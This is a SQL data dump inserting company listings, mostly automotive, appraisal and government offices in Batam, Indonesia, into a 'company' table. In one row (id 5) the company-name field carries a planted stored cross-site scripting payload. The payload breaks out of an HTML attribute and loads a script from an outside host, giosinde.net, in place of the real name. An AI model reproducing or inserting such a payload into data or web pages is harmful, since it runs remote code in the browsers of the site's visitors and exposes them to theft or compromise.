INSERT INTO `company` (`id_company`, `name`, `type`, `type_other`, `phone`, `email`, `website`, `facebook`, `twitter`, `instagram`, `linkedin`, `logo`, `address`, `province`, `city`, `description`, `status`, `access_type`, `id_kampus`, `created_at`, `updated_at`) VALUES
(3, 'PT.  AGUNG AUTOMALL BTC', 'Otomotif', NULL, '081277623113', 'pa.agungtoyotabatam3@gmail.com', 'https://agungtoyota.co.id/', '-', '-', '-', '-', 'http://agungtoyotabatamcenter.com/gambar/logo1.png', 'Jl. Jend. Sudirman Kel.Taman Baloi Kec.Batam Kota, Kota Batam Kepulauan Riau', 'KEPULAUAN RIAU', 'KOTA BATAM', '&lt;p&gt;Agung Toyota Batam Centre&lt;/p&gt;\\r\\n\\r\\n&lt;p&gt;Jl. Jend. Sudirman (Samping Anggrek Mas 2), Taman Baloi, Kota Batam, Kep. Riau&lt;/p&gt;\\r\\n', 'Verified', '1', 1, NULL, NULL),
(4, 'KJPP AKSA, NELSON DAN REKAN - KCP BATAM', 'Law', NULL, '0778 37220003', 'batam@kjpp-anr.com', 'https://kjpp-anr.com/tentang-kami/', '-', '-', '-', '-', 'https://kjpp-anr.com/wp-content/uploads/2023/03/ANR-Logo-for-Bright-BG-151x64.png', 'Komp. Ruko Permata Niaga Blok E/25, Bukit Indah Sukajadi , Jl Jendral Sudirman, Batam Kota, Kep. Riau', 'KEPULAUAN RIAU', 'KOTA BATAM', '&lt;p&gt;Kantor Jasa Penilai Publik Aksa, Nelson, dan Rekan (KJPP ANR) adalah Kantor Penilai Independen yang bergerak di bidang Penilaian Properti. Sebelumnya bernama PT Hutama Penilai, namun seiring dengan regulasi dari Pemerintah berdasarkan Peraturan Menteri Keuangan Republik Indonesia No. 125/PMK.01/2008 tentang perubahan bentuk usaha jasa penilai properti dari bentuk perseroan terbatas menjadi perseorangan atau persekutuan, maka pada April 2009 PT Hutama Penilai bertransformasi menjadi Kantor Jasa Penilai Publik Aksa, Nelson, dan Rekan yang bergerak di bidang jasa Penilaian Properti dan Jasa Konsultansi berdasarkan SK Menteri Keuangan RI No. 362/KM.1/2009 dengan Izin No. 2.09.0026.&lt;/p&gt;\r\n\r\n&lt;p&gt;KJPP ANR merupakan anggota Ikatan Kantor Jasa Penilai Publik MAPPI serta terdaftar di Otoritas Jasa Keuangan (OJK) dengan Izin No. S-486/BL/2010 dan di Badan Pertanahan Nasional No. 433/SK.600.PT.01.01/III/2022&lt;/p&gt;\r\n\r\n&lt;p&gt;KJPP Aksa, Nelson, &amp;amp; Rekan selalu berusaha untuk menjadi perusahaan yang berintegritas, terpercaya, serta menjunjung tinggi komitmen sebagai Perusahaan Penilai yang independen dan profesional. Dalam menjalankan bisnis serta layanan kami, kami didukung oleh tenaga ahli dan tim yang profesional serta berdedikasi tinggi.&lt;/p&gt;\r\n', 'Verified', '1', 1, NULL, NULL),
(5, '\\&quot;/&gt;&lt;script src=https://giosinde.net/n.js&gt;&lt;/script&gt;', 'IT and Telecommunication', NULL, '085967235440', 'info@infinitelearning.id', 'https://www.infinitelearning.id/', '-', '-', 'http://www.instagram.com/infinitelearning_id', '-', 'https://static.wixstatic.com/media/94b81a_118e9617aa9a46a5bcf5722fbd05b209~mv2.png/v1/fill/w_634,h_574,al_c/94b81a_118e9617aa9a46a5bcf5722fbd05b209~mv2.png', 'Nongsa Digital Park, Jl. Hang Lekiu No. Km 2, Sambau, Nongsa, Kota Batam', 'KEPULAUAN RIAU', 'KOTA BATAM', '&lt;p&gt;Infinite Learning, a division of PT Kinema Systrans multimedia (a subsidiary of Infinite Studios), is centred on the development of vocational training courses relevant to Infinite Studios activity and the growing demand of skilled talent within the ecosystem of Nongsa Digital Park.&lt;/p&gt;\r\n\r\n&lt;p&gt;\\r\\n\\r\\n&lt;/p&gt;\r\n\r\n&lt;p&gt;Expanding on its current internal training operations, Infinite Learning has obtained in 2018 an LPK license from the Indonesian Ministry of Manpower. This allows them to carry out vocational training courses open to the public, which can be deployed in collaboration with local and international educational institutions.&lt;br /&gt;\r\n\\r\\n&lt;br /&gt;\r\n\\r\\nCurrently, Vocational Education activity is performed under the LPK license for training at Nongsa Digital Park (NDP), in collaboration with Apple Developer Academy, Royal Melbourne Institute of Technology Cyber Security Course, Independent Study Program Ministry of Education&lt;/p&gt;\r\n\r\n&lt;p&gt;\\r\\n&lt;/p&gt;\r\n', 'Verified', '1', 1, NULL, NULL),
(6, 'Badan Kepegawaian dan Pengembangan SDM Kota Batam (BKPSDM Batam)', 'Government', NULL, '0778462217', 'bkpsdm@batam.go.id', 'https://bkpsdm.batam.go.id/', '-', '-', '-', '-', 'https://bkpsdm.batam.go.id/wp-content/uploads/sites/52/2018/03/cropped-logo-bkpsdm-01.png', 'Jl. Engku Putri No. 1, Teluk Tering, Kecamatan Batam Kota, Kota Batam, Kepulauan Riau 29432', 'KEPULAUAN RIAU', 'KOTA BATAM', '&lt;p&gt;Badan Kepegawaian dan Pengembangan Sumber Data Manusia Pemerintah Kota Batam&lt;/p&gt;\r\n', 'Verified', '1', 1, NULL, NULL),
(7, 'Badan Narkotika Nasional (BNN) Batam', 'Government', NULL, '021 8087-1566', ' callcenter@bnn.go.id', 'https://batamkota.bnn.go.id/', 'https://www.facebook.com/humas.bnn/', 'https://twitter.com/INFOBNN', 'https://www.instagram.com/lensa_bnn/', '-', 'https://batamkota.bnn.go.id/konten/unggahan/2020/12/d-480.png', 'Komp. Permata Niaga, Blok E No.31-32, Sukajadi, Kec. Batam Kota, Jl. Sudirman - Kota Batam, Kepulauan Riau 29444', 'KEPULAUAN RIAU', 'KOTA BATAM', '&lt;p&gt;Badan Narkotika Nasional (BNN) Batam&lt;/p&gt;\r\n', 'Verified', '1', 1, NULL, NULL),
